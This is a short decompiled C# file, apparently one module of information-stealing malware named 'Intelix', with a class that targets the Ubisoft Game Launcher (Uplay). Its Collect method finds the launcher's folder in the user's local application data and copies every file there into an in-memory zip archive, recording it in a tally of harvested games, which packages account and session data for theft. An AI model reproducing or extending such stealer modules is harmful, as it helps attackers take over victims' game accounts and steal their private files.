using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x0200002B RID: 43
	public class Uplay : ITarget
	{
		// Token: 0x06000079 RID: 121 RVA: 0x00006048 File Offset: 0x00004248
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Uplay";
				zip.AddDirectoryFiles(text, "Uplay", true);
				counterApplications.Files.Add(text + " => \\Uplay");
				counterApplications.Files.Add("Uplay\\");
				counter.Games.Add(counterApplications);
			}
		}
	}
}
